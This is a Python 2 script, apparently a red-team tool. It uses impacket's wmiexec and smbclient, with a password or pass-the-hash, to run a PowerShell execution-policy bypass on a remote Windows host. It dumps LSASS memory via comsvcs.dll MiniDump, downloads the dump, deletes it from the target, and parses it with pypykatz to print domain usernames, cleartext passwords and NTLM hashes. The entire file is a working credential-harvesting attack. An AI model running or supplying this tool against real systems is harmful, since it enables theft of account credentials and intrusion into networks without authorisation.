#!/usr/bin/env python
'''
Using native client to dump lsass memory and analyse file with pypykatz

Created by DVS
'''

import subprocess, os, argparse, time, datetime, socket, base64, threading, Queue, hashlib, binascii, signal, sys, getpass
from optparse import OptionParser
from impacket.smbconnection import *
from impacket.nmb import NetBIOSError
import errno
import os
import sys
from os import listdir
from os.path import isfile, join
import json
data = ""
fields = ['password','username','domainname','lmhash','nthash',]

copy = False
user = ""
wmiexec = "/opt/impacket/examples/wmiexec.py"
smbclient = "/opt/impacket/examples/smbclient.py"
def main(username, password, domain, target):
	host = target
	usern = username
	passwd = password
	dom = domain
	try:
		if len(passwd) < 64:
#			print "[*]	Getting LSASS Process ID" 
			getprocid = ("python {} {}/{}:{}@{} 'powershell -exec bypass -c 'Get-Process lsass''").format(wmiexec, dom, usern, passwd, host)
			procidrun = os.popen(getprocid).read()
			procid = procidrun.split()[-3]
			if "STATUS_LOGON_FAILURE" in procidrun:
				print "[-]	Wrong Creds!"
				sys.exit()
			elif "STATUS_ACCESS_DENIED" in procidrun:
				print "[-]	Failed to upload, STATUS_ACCESS_DENIED...Not a privileged user?"
				sys.exit()
			else:
				dumplssas = ("python {} {}/{}:{}@{} 'powershell -exec bypass -c 'C:\\\\Windows\\\\System32\\\\rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll MiniDump {} C:\\\\{}-lsass.dmp full''").format(wmiexec, dom, username, passwd, host, procid, host)
				dumprun = os.popen(dumplssas).read()
				if "Errno Connection error" in dumprun:
					print "[-]	Connection Died"
					sys.exit()
				else:
					print "[+]	Dump Written to {}-lsass.dmp".format(host)
#					print "[*]	Downloading Dump"
					createdump = ("printf 'use C$\nget {}-lsass.dmp\n' > getdmp").format(host)
					createrun = os.popen(createdump).read()
					downdump = ("python {} {}/{}:{}@{} -f getdmp").format(smbclient, dom, usern, passwd, host)
					downrun = os.popen(downdump).read()
					print "[+]	Download Complete"
#					print "[*]	Cleaning up"
					cleanproc = ("python {} {}/{}:{}@{}  'del C:\{}-lsass.dmp'").format(wmiexec, dom, usern, passwd, host, host)
					cleanprocrun = os.popen(cleanproc).read()
					cleandump = ("rm getdmp")
					runcleandump = os.popen(cleandump).read()
					print "[+]	Cleanup completed"
					print "[*]	Analysing Dump File"
					runpypy = ("pypykatz lsa minidump {}-lsass.dmp --json -o {}-dump 2>/dev/null").format(host, host)
					dopypy = os.popen(runpypy).read()
		if len(passwd) > 64:
#			print "[*]	Getting LSASS Process ID" 
			getprocid = ("python {} {}/{}@{} 'powershell -exec bypass -c 'Get-Process lsass'' -hashes {} ").format(wmiexec, dom, usern, host, passwd)
			procidrun = os.popen(getprocid).read()
			procid = procidrun.split()[-3]
			if "STATUS_LOGON_FAILURE" in procidrun:
				print "[-]	Wrong Creds!"
				sys.exit()
			elif "STATUS_ACCESS_DENIED" in procidrun:
				print "[-]	Failed to upload, STATUS_ACCESS_DENIED...Not a privileged user?"
				sys.exit()
			else:
				dumplssas = ("python {} {}/{}@{} 'powershell -exec bypass -c 'C:\\\\Windows\\\\System32\\\\rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll MiniDump {} C:\\\\{}-lsass.dmp full'' -hashes {} ").format(wmiexec, dom, username, host, procid, host, passwd)
				dumprun = os.popen(dumplssas).read()
				if "Errno Connection error" in dumprun:
					print "[-]	Connection Died"
					sys.exit()
				else:
					print "[+]	Dump Written to {}-lsass.dmp".format(host)
#					print "[*]	Downloading Dump"
					createdump = ("printf 'use C$\nget {}-lsass.dmp\n' > getdmp").format(host)
					createrun = os.popen(createdump).read()
					downdump = ("python {} {}/{}@{} -f getdmp -hashes {}").format(smbclient, dom, usern, host, passwd)
					downrun = os.popen(downdump).read()
					print "[+]	Download Complete"
#					print "[*]	Cleaning up"
					cleanproc = ("python {} {}/{}@{} 'del C:\{}-lsass.dmp' -hashes {} ").format(wmiexec, dom, usern, host, host, passwd)
					cleanprocrun = os.popen(cleanproc).read()
					cleandump = ("rm getdmp")
					runcleandump = os.popen(cleandump).read()
					print "[+]	Cleanup completed"
					print "[*]	Analysing Dump File"
					runpypy = ("pypykatz lsa minidump {}-lsass.dmp --json -o {}-dump 2>/dev/null").format(host, host)
					dopypy = os.popen(runpypy).read()




	except:	
		pass

if __name__ == "__main__":
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--username', help='Enter Domain User')
        parser.add_argument('-p', '--password', help='Enter Domain password')
        parser.add_argument('-d', '--domain', help='Enter Domain name')
        parser.add_argument('-t', '--target', help='Target IP')
        args = parser.parse_args()
main(args.username, args.password, args.domain, args.target)
print "=============================================================================================="
file_1 = args.target+"-dump"
with open(file_1, 'r') as json_file:
	data = json.load(json_file)
for f in data:
	for u in data[f]['logon_sessions']:
		username = ""
		password = ""
		domainame = ""
		lmhash = ""
		nthash = ""
		for d in data[f]['logon_sessions'][u]:
			if d.lower() in fields:
				if d.lower() == "username":
					username = data[f]['logon_sessions'][u][d]
				if d.lower() == "password":
					if not data[f]['logon_sessions'][u][d]:
						password = "No password found"
					else:
						password = data[f]['logon_sessions'][u][d]
				if d.lower() == "domainname":
					domainname = data[f]['logon_sessions'][u][d]
				if d.lower() == "lmhash":
					lmhash = data[f]['logon_sessions'][u][d]
				if d.lower() == "nthash":
					nthash = data[f]['logon_sessions'][u][d]
			if isinstance(data[f]['logon_sessions'][u][d], list) and len(data[f]['logon_sessions'][u][d]) > 0:
				for e in data[f]['logon_sessions'][u][d][0]:
					if e.lower() in fields:
						if e.lower() == "username":
		                                        username = data[f]['logon_sessions'][u][d][0][e]
       	        		                if e.lower() == "password":
							if not data[f]['logon_sessions'][u][d][0][e]:
								password = "No password found"
							else:
       	                		                	password = data[f]['logon_sessions'][u][d][0][e]
       	                		        if e.lower() == "domainname":
       	                		                domainname = data[f]['logon_sessions'][u][d][0][e]
       	                		        if e.lower() == "lmhash":
       	                        		        lmhash = data[f]['logon_sessions'][u][d][0][e]
       	                       			if e.lower() == "nthash":
       	                                		nthash = data[f]['logon_sessions'][u][d][0][e]

		if password == "No password found" and nthash:
			print domainname+"\\"+username+": "+"aad3b435b51404eeaad3b435b51404ee:"+nthash
		if password != "No password found" and not nthash and password:
			print domainname+"\\"+username+": "+password 
		if password == "No password found" and lmhash and nthash:
			print domainname+"\\"+username+": "+lmhash+":"+nthash
